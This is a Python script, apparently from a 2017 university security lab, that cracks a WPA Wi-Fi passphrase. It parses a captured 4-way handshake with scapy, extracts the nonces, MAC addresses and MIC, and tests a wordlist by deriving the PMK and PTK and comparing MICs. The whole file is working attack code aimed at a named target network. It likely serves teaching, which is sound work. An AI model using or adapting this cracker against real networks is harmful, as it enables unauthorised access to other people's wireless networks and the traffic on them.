#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Lecture d'une passphrase depuis un fichier, dérivation des clés depuis cette passphrase, calcul du MIC à partir de ces
clés, récupération du MIC depuis le dernier message du 4-way handshake et comparaison des deux MICs pour contrôler si
la passphrase supposée est la bonne.
"""

__author__      = "Gabriel Roch & Cassandre Wojciechowski"
__copyright__   = "Copyright 2017, HEIG-VD"
__license__ 	= "GPL"
__version__ 	= "1.0"
__email__ 		= "abraham.rubinstein@heig-vd.ch, gabriel.roch@heig-vd.ch, cassandre.wojciechowski@heig-vd.ch"
__status__ 		= "Prototype"

from scapy.all import *
from binascii import a2b_hex, b2a_hex
from pbkdf2 import *
from numpy import array_split
from numpy import array
import hmac, hashlib

def customPRF512(key,A,B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i    = 0
    R    = b''
    while i<=((blen*8+159)/160):
        hmacsha1 = hmac.new(key,A+str.encode(chr(0x00))+B+str.encode(chr(i)),hashlib.sha1)
        i+=1
        R = R+hmacsha1.digest()
    return R[:blen]

# Read capture file -- it contains beacon, authentication, association, handshake and data
wpa=rdpcap("wpa_handshake.cap")
# Network we want to attack
ssid = "SWI"

for packet in wpa :
    # The first packet with type, subtype and proto at 0 is an Association Request
    # It contains part of the info we seek (MAC address of AP and STA and ssid)
    # We check if the packet is and Asso Req from the network we want to attack
    if (packet.type == 0x0) and (packet.subtype == 0x0) and (packet.proto == 0x0) and (packet.info.decode('ascii') == ssid):
        # AP MAC address
        APmac = a2b_hex((packet.addr1).replace(":", ""))
        # STA MAC address
        Clientmac = a2b_hex((packet.addr2).replace(":", ""))
        break

# We look for the Authenticator Nonce in the first key exchange packet
for packet in wpa :
    if (packet.type == 0x2) and (packet.subtype == 0x0) and (packet.proto == 0x0) :
        ANonce = packet.load[13:45]
        break

first_packet = True

# We look for the Supplicant Nonce and the MIC in the following packets
for packet in wpa :
    if first_packet and (packet.type == 0x0) and (packet.subtype == 0x0) and (packet.proto == 0x1) :
        SNonce = Dot11Elt(packet).load[65:97]
        first_packet = False

    elif (packet.type == 0x0) and (packet.subtype == 0x0) and (packet.proto == 0x1) :
        mic_to_test = Dot11Elt(packet).load[129:-2].hex()
        break

# We create a list of passphrases from a text file
with open('passphrases.txt') as file :
    passphrases = [word for line in file for word in line.split()]

# For each potential passphrase in the file we calculate the MIC
for passPhrase in passphrases :
    print("Passphrase tested     : ", passPhrase)

    A           = "Pairwise key expansion" #this string is used in the pseudo-random function
    B           = min(APmac,Clientmac)+max(APmac,Clientmac)+min(ANonce,SNonce)+max(ANonce,SNonce) #used in pseudo-random function
    data        = a2b_hex("0103005f02030a0000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000") #cf "Quelques détails importants" dans la donnée

    #calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
    passPhrase = str.encode(passPhrase)
    pmk = pbkdf2(hashlib.sha1,passPhrase, str.encode(ssid), 4096, 32)

    #expand pmk to obtain PTK
    ptk = customPRF512(pmk,str.encode(A),B)

    #calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
    mic = hmac.new(ptk[0:16],data,hashlib.sha1)

    # MIC calculated with key derivated from potential passphrase tested
    current_mic = mic.hexdigest()[:-8]

    # If the MIC calculated above is the same as the one from the last 4-way handshake message, we found the passphrase
    if current_mic == mic_to_test :
        print("PASSPHRASE FOUND      : ", passPhrase.decode())
        exit(0)

    print("Incorrect passphrase  : ", passPhrase.decode())

print("No passphrase found")
exit(1)
